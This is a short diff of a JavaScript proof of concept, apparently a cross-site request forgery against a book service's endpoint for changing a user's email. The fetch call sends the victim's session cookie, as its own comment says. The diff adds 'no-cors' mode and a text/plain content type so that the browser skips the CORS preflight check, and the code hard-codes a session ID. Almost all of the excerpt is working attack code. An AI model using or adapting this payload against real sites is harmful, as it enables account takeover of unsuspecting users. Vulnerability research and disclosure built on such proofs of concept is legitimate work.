@@ -3,8 +3,9 @@
 fetch("https://api.bookbeat.com/api/users/email", {
   method:      "PUT",
   credentials: "include", // attaches victim's session cookie
+  mode:        "no-cors", 
   headers: {
-    "Content-Type": "application/json",
+     "Content-Type": "text/plain",
     "Bb-Client":    "bookbeatweb",
     "Bb-Market":    "uk",
     "Bb-Session-Id": "a39eb591-ea5d-4224-8cd7-c38c731cf01d",
